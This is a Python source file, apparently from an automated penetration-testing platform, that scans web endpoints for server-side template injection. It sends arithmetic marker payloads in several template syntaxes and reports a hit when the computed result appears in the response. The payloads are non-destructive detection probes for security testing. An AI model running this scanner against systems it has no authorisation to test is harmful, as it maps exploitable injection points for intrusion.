"""
Outil de test d'injection de template côté serveur (SSTI) pour PENTAGON.

Prouve, PAR ATTAQUE RÉELLE mais NON DESTRUCTIVE, qu'un paramètre est injecté
dans un template RENDU CÔTE SERVEUR dont le moteur ÉVALUE les expressions.
Si l'application évalue une expression arithmétique que nous contrôlons, c'est
que l'entrée atteint le moteur de template : l'exécution de code côté serveur
devient possible (RCE potentielle).

Méthode (boîte noire, offensive, bornée à la preuve) :
  1. On cible des endpoints candidats (découverts + chemins de rendu courants)
     et des noms de paramètre « texte/template » usuels.
  2. On injecte une EXPRESSION ARITHMÉTIQUE marqueur dans plusieurs syntaxes de
     moteurs répandus ({{..}}, ${..}, <%=..%>, #{..}, {..}).
  3. Si la réponse contient le RÉSULTAT calculé du marqueur (et non le littéral
     injecté), l'évaluation côté serveur est PROUVÉE.

GARDE-FOU « prouver, jamais ravager » : la charge est une simple MULTIPLICATION
(aucun accès système, aucune commande) — on prouve l'évaluation, pas davantage.

Le marqueur `7331 * 7 = 51317` est choisi pour être improbable dans une page
normale : sa seule présence atteste de l'évaluation.

Conçu pour être GÉNÉRIQUE : aucune donnée spécifique à une cible.

Catégorie d'action RoE : exploitation (outil offensif).
Standards :
- OWASP A03:2021 (Injection)
- OWASP WSTG-INPV-18 (Testing for Server-Side Template Injection)
- CWE-1336 (Improper Neutralization of Special Elements Used in a Template
  Engine), CWE-94 (Code Injection)
- MITRE ATT&CK T1059 (Command and Scripting Interpreter)
"""

from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse


DEFAULT_TIMEOUT = 15

# Marqueur arithmétique improbable : facteurs et résultat attendu.
SSTI_FACTOR_A = 7331
SSTI_FACTOR_B = 7
SSTI_EXPR = f"{SSTI_FACTOR_A}*{SSTI_FACTOR_B}"          # "7331*7"
SSTI_RESULT = str(SSTI_FACTOR_A * SSTI_FACTOR_B)        # "51317"

# Charges dans plusieurs syntaxes de moteurs de template répandus.
PAYLOADS = [
    "{{" + SSTI_EXPR + "}}",       # Jinja2 / Twig / Handlebars-like / moteur JS
    "${" + SSTI_EXPR + "}",        # littéral de gabarit JS / Thymeleaf / FreeMarker
    "#{" + SSTI_EXPR + "}",        # Pug/Jade / Ruby
    "<%= " + SSTI_EXPR + " %>",    # ERB / EJS
    "{" + SSTI_EXPR + "}",         # moteurs minimalistes
]

# Noms de paramètres « texte/template » usuels (les plus courants en tête).
TEMPLATE_PARAMS = ["name", "template", "tpl", "q", "query", "search", "page",
                   "view", "content", "msg", "message", "greeting", "input",
                   "text", "title", "user"]

# Endpoints de rendu courants (sondés même sans découverte).
COMMON_RENDER_PATHS = ["/api/render", "/render", "/api/template", "/api/preview",
                       "/preview", "/api/greet", "/greet", "/api/hello"]

# Indices qu'un endpoint découvert fait probablement du rendu de template.
RENDER_HINTS = ("render", "template", "preview", "greet", "hello", "welcome",
                "page", "view", "email", "message", "name", "card")


def _is_evaluated(text: str) -> bool:
    """
    Vrai si la réponse contient le RÉSULTAT calculé du marqueur : sa présence
    ne peut s'expliquer que par une évaluation côté serveur (une simple
    réflexion renverrait le littéral « 7331*7 », pas « 51317 »).
    """
    return bool(text) and SSTI_RESULT in text


def _base_origin(url: str) -> str:
    """Origine (scheme://host[:port]) d'une URL ou d'un domaine."""
    p = urlparse(url if url.startswith("http") else f"https://{url}")
    return f"{p.scheme}://{p.netloc}"


def _candidate_endpoints(target_base: str,
                         candidate_urls: list[str] | None) -> list[str]:
    """Chemins de rendu courants + endpoints découverts pertinents."""
    origin = _base_origin(target_base)
    endpoints: list[str] = [origin + p for p in COMMON_RENDER_PATHS]
    seen = set(endpoints)
    for url in candidate_urls or []:
        u = url if url.startswith("http") else origin + (url if url.startswith("/") else "/" + url)
        u = u.split("?", 1)[0]
        if any(h in u.lower() for h in RENDER_HINTS) and u not in seen:
            endpoints.append(u)
            seen.add(u)
    return endpoints


def run_ssti_test(target_base: str,
                  candidate_urls: list[str] | None = None,
                  token: str | None = None,
                  timeout: int = DEFAULT_TIMEOUT,
                  delay_between_requests: float = 0.3) -> dict[str, Any]:
    """
    Teste l'injection de template côté serveur sur des endpoints candidats.

    Returns:
        {
          "status": "success" | "error",
          "tested_endpoints": [...],
          "findings": [{title, severity, affected_endpoint, param, payload,
                        evidence, owasp, cwe, confidence}],
          "vulnerable": bool,
          "error": "..."
        }
    """
    import time
    import requests  # import différé (tool offensif exécuté sur la plateforme)

    result: dict[str, Any] = {
        "status": "success",
        "tested_endpoints": [],
        "findings": [],
        "vulnerable": False,
        "error": None,
    }

    endpoints = _candidate_endpoints(target_base, candidate_urls)
    result["tested_endpoints"] = endpoints
    headers = {"User-Agent": "PENTAGON-Exploitation-Agent/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    findings: list[dict[str, Any]] = []
    started = datetime.now(timezone.utc)

    for endpoint in endpoints:
        proven = False
        for param in TEMPLATE_PARAMS:
            if proven:
                break
            for payload in PAYLOADS:
                try:
                    resp = requests.get(endpoint, params={param: payload},
                                        headers=headers, timeout=timeout,
                                        allow_redirects=False)
                except requests.exceptions.RequestException:
                    continue
                finally:
                    time.sleep(delay_between_requests)

                if _is_evaluated(resp.text or ""):
                    findings.append({
                        "title": "Injection de template côté serveur (SSTI)",
                        "severity": "critical",
                        "affected_endpoint": f"{endpoint}?{param}=",
                        "param": param,
                        "payload": payload,
                        "evidence": f"Expression « {SSTI_EXPR} » évaluée à « {SSTI_RESULT} » dans la réponse",
                        "owasp": "A03:2021",
                        "cwe": "CWE-1336",
                        "confidence": 0.97,
                    })
                    proven = True
                    result["vulnerable"] = True
                    break

    result["findings"] = findings
    result["duration_seconds"] = (datetime.now(timezone.utc) - started).total_seconds()
    return result


if __name__ == "__main__":
    import json
    import sys
    base = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    print(json.dumps(run_ssti_test(base), indent=2, ensure_ascii=False, default=str))
